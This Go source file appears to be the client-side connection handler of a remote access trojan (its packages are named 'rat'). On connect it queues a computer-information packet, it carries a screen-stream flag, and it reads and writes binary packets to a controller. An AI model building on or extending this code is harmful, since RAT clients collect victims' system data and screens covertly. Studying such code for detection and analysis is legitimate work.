package main

import (
	"encoding/binary"
	"io"
	"log"
	"net"
	"rat/shared"
	"rat/shared/network"
	"rat/shared/network/header"
)

type Connection struct {
	net.Conn
	network.Writer
	network.Reader
}

var Queue chan OutgoingPacket

func (c *Connection) Init() {
	Queue <- &ComputerInfoPacket{}
}

func (c *Connection) Close() {
	screenStream = false

	c.Conn.Close()
}

func (c *Connection) ReadHeader() (header.PacketHeader, error) {
	var h header.PacketHeader
	err := binary.Read(c, shared.ByteOrder, &h)

	return h, err
}

func (c *Connection) WriteHeader(header header.PacketHeader) error {
	return binary.Write(c.Conn, shared.ByteOrder, header)
}

func (c *Connection) WritePacket(packet OutgoingPacket) error {
	err := c.WriteHeader(packet.Header())

	if err != nil {
		return err
	}

	return c.Writer.WritePacket(packet)
}

type IncomingPacket interface {
	OnReceive() error
	Decode(buf []byte) (IncomingPacket, error)
}

type OutgoingPacket interface {
	Init()
	Header() header.PacketHeader
}

func (c Connection) ReadPacket() (IncomingPacket, error) {
	h, err := c.ReadHeader()
	if err != nil {
		return nil, err
	}

	var n int32
	err = binary.Read(c.Reader.Reader, shared.ByteOrder, &n)
	buf := make([]byte, n)
	io.ReadFull(c.Reader.Reader, buf)

	packet := GetIncomingPacket(h)

	packet, err = packet.Decode(buf)

	if err != nil {
		log.Fatal(err)
	}

	return packet, packet.OnReceive()
}
